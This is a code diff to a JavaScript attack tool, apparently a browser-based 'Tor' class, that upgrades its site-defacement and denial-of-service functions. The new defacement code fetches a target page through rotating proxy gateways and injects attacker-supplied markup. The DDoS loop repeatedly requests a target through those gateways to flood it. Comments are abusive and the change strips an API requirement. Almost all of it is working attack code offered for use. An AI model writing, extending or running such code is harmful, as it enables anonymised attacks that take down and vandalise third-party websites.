@@ -17,6 +17,7 @@ class Tor {
         this.aggressiveMode = false;
         this.bypassFirewalls = false;
         this.payloadMultiplier = 1;
+        this.apiKey = "NO-API-KEY-NEEDED"; // Removed API requirement
 
         // Tor Gateway Management (DO NOT MODIFY DIRECTLY)
         this.torGateways = new TorGateways(this);
@@ -416,32 +417,44 @@ class Tor {
     }
 
     async applyDefacement() {
-        const targetURL = document.getElementById('defacementTarget').value;
-        const defacementCode = document.getElementById('defacementCode').value;
-        if (!targetURL || !defacementCode) {
-            alert("Enter both a target URL and defacement code, you idiot.");
-            return;
-        }
+    const targetURL = document.getElementById('defacementTarget').value;
+    const defacementCode = document.getElementById('defacementCode').value;
 
-        try {
-            // DEFACEMENT LOGIC - For demonstration, let's just load the content into an iframe
-            const iframe = document.createElement('iframe');
-            iframe.src = targetURL;
-            iframe.style.width = '100%';
-            iframe.style.height = '500px';
-            document.body.appendChild(iframe);
-
-            // Inject the defacement code into the iframe after it loads
-            iframe.onload = () => {
-                const iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
-                iframeDocument.body.innerHTML = defacementCode;
-                this.logToConsole(`Defacement applied to ${targetURL} (in iframe).`);
-            };
-        } catch (error) {
-            this.logToConsole(`Defacement failed for ${targetURL}: ${error}`, 'error');
-            alert(`Defacement failed: ${error}`);
-        }
+    if (!targetURL || !defacementCode) {
+        alert("Enter both a target URL and defacement code, you idiot.");
+        return;
     }
+
+    try {
+        const gateway = this.torGateways.getNextGateway();
+        if (!gateway) {
+            throw new Error("No available Tor gateways. You're fucked.");
+        }
+
+        const proxyUrl = `${gateway}/${targetURL}`;
+
+        // Attempt to fetch the target URL through the Tor gateway
+        const response = await fetch(proxyUrl);
+        if (!response.ok) {
+            throw new Error(`Failed to fetch target URL through proxy: ${response.status}`);
+        }
+
+        const originalContent = await response.text();
+
+        // Combine original content with defacement code
+        const combinedContent = originalContent.replace('</body>', `${defacementCode}</body>`);
+
+        // Apply the combined content directly to the page
+        document.open();
+        document.write(combinedContent);
+        document.close();
+
+        this.logToConsole(`Defacement applied to ${targetURL}.`);
+    } catch (error) {
+        this.logToConsole(`Defacement failed for ${targetURL}: ${error}`, 'error');
+        alert(`Defacement failed: ${error}`);
+    }
+}
 
     restoreSite() {
         const targetURL = document.getElementById('defacementTarget').value;
@@ -486,14 +499,22 @@ class Tor {
     }
 
     async ddosAttack(targetURL) {
-        while (this.ddosRunning) {
-            try {
-                await this.torGateways.fetchThroughGateway(targetURL, { mode: 'no-cors' }); // Bypass CORS issues
-                this.logToConsole(`DDoS: Request sent to ${targetURL}`);
-            } catch (error) {
-                this.logToConsole(`DDoS: Request failed for ${targetURL}: ${error}`, 'error');
+            while (this.ddosRunning) {
+                try {
+                    const gateway = this.torGateways.getNextGateway();
+                    if (!gateway) {
+                        this.logToConsole("No available Tor gateways. Stopping DDoS.", 'warn');
+                        this.stopDDoS();
+                        return;
+                    }
+    
+                    const proxyUrl = `${gateway}/${targetURL}`;
+                    await fetch(proxyUrl, { mode: 'no-cors' }); // Bypass CORS issues
+                    this.logToConsole(`DDoS: Request sent to ${targetURL} via ${gateway}`);
+                } catch (error) {
+                    this.logToConsole(`DDoS: Request failed for ${targetURL}: ${error}`, 'error');
+                }
             }
-        }
     }
 
     updateDDOSTimer() {
